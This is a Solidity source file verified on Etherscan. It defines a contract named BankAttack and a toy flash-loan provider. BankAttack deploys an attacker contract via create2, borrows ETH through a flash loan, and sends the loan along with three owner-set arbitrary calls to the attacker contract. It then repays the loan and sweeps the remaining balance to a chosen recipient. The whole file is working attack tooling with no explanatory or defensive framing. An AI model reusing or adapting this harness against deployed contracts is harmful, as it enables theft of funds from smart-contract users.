/**
 *Submitted for verification at Etherscan.io on 2021-05-21
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, 'SafeMath: addition overflow');

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, 'SafeMath: subtraction overflow');
  }

  function sub(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, 'SafeMath: multiplication overflow');

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, 'SafeMath: division by zero');
  }

  function div(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, 'SafeMath: modulo by zero');
  }

  function mod(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

interface IFlashLoanProvider{
    function flashloan(uint256 amount, bytes calldata data) external;
}

contract BankAttack {
    using SafeMath for uint256;
    
    address public attacker;
    address public owner;
    
    uint256 public WAD = 1 ether;
    
    constructor() public {
        owner = msg.sender;
    }
    
    modifier onlyOwner(){
        require(msg.sender == owner, "!owner");
        _;
    }
    
    function createContract(bytes calldata _ccode, uint256 _salt) external onlyOwner {
            
        bytes memory ccode = _ccode;
        address _attacker;
        assembly {
            _attacker := create2(0, add(ccode, 0x20), mload(ccode), _salt)

            if iszero(extcodesize(_attacker)) {
                revert(0, 0)
            }
        }
        
        attacker = _attacker;
    }
    
    bytes public call1;
    bytes public call2;
    bytes public call3;
    
    function setCall1(bytes calldata _call1) external onlyOwner {
        call1 = _call1;
    }
    
    function setCall2(bytes calldata _call2) external onlyOwner {
        call2 = _call2;
    }    
    
    function setCall3(bytes calldata _call3) external onlyOwner {
        call3 = _call3;
    }
    
    function flashAttack(address provider, address receipent) external onlyOwner {
        
        bytes memory params = abi.encode(receipent);
        
        IFlashLoanProvider(provider).flashloan(WAD, params);
        
    }
    
    
    function flashCallback(uint256 fee, bytes calldata data) external {
        
        attacker.call.value(WAD)(call1);
        attacker.call.value(0)(call2);
        attacker.call.value(0)(call3);
        
        uint256 amountOwing = WAD.add(fee);
        
        payable(msg.sender).transfer(amountOwing);
        
        (address receipent) = abi.decode(data, (address));
        
        payable(receipent).transfer(address(this).balance);
        
    }
    
    
}

interface IFlashloanReceiver{
    function flashCallback(uint256 fee, bytes calldata data) external;
}

contract FlashLoanProvider{
    
    using SafeMath for uint256;
    
    function flashloan(uint256 amount, bytes calldata data) external {
        
        uint256 preBalance = address(this).balance;
        
        payable(msg.sender).transfer(amount);
        
        uint256 fee = amount.mul(10).div(10000);
        
        IFlashloanReceiver(msg.sender).flashCallback(fee, data);
        
        require(address(this).balance >= preBalance.add(fee), "Not enough returned");
        
    }
    
}